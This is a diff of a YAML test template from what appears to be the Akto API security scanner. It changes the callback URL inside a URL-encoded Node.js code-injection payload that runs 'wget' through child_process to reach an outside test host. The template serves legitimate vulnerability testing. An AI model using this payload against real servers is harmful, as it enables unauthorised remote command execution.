@@ -49,7 +49,7 @@ execute:
       - send_ssrf_req:
           url: "https://test-services.akto.io/store_uuid/${random_uuid}"
       - add_query_param:
-          defaultFilter: "%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://test-services.akto.io/store_uuid/${random_uuid}%27);//"
+          defaultFilter: "%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://test-services.akto.io/${random_uuid}%27);//"
 validate:
   response_payload:
     length:
